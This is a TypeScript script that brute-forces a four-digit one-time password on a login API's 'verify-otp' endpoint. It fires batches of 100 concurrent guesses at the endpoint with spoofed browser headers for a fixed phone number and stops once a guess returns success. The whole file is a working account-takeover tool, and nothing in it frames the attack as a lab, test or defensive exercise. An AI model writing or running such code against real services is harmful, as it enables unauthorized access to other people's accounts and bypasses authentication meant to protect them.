import axios from "axios";

// Function to send OTP verification request
// 1111111111
async function GetData(Otp: string) {
  const data = JSON.stringify({
    type: "web4",
    contactNumber: "1111111111", // Your phone number
    otp: Otp,
    referralCode: null,
    userInterest: "web",
    countryCode: 91,
    logoutAllDevices: false,
  });

  const config = {
    method: "post",
    maxBodyLength: Infinity,
    url: "https://api.localhost.com/api/auth/verify-otp",
    headers: {
      "Content-Type": "application/json",
      Accept: "application/json, text/plain, */*",
      "Sec-Fetch-Site": "same-site",
      "Accept-Language": "en-IN,en-GB;q=0.3,en;q=0.4",
      "Accept-Encoding": "gzip, deflate, br",
      "Sec-Fetch-Mode": "cors",
      Host: "api.localhost.com",
      Origin: "https://localhost.com",
      "User-Agent":
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/345.1.15 (KHTML, like Gecko) Version/18.0.1 Safari/605.1.15",
      Referer: "https://localhost.com/",
      "Content-Length": "120",
      Connection: "keep-alive",
      "Sec-Fetch-Dest": "empty",
    },
    data: data,
  };

  try {
    const response = await axios.request(config);

    if (response.status === 200) {
      console.log(
        `🎉 OTP ${Otp} verified successfully! and your otp is ${Otp}`
      );
      return true; // Indicate success
    } else {
      console.log(`Failed OTP ${Otp}, Status: ${response.status}`);
    }
  } catch (error: any) {
    console.error(`Error verifying OTP ${Otp}:`, error.message);
  }

  return false;
}

async function main() {
  const batchSize = 100;
  const totalOtpCount = 10000;

  for (let i = 1000; i < totalOtpCount; i += batchSize) {
    const promises = [];

    console.log(
      `Processing OTPs from ${i} to ${Math.min(
        i + batchSize - 1,
        totalOtpCount - 1
      )}`
    );

    for (let j = 0; j < batchSize; j++) {
      const otp = i + j;
      const otpString = otp < 1000 ? `0${otp}` : otp.toString(); // Manually ensure 4-digit OTPs
      promises.push(GetData(otpString));
    }

    const results = await Promise.all(promises);

    if (results.includes(true)) {
      console.log("Stopping further OTP attempts. 🎉");
      break;
    }

    await new Promise((resolve) => setTimeout(resolve, 500));
  }

  console.log("Finished processing OTPs.");
}

main();
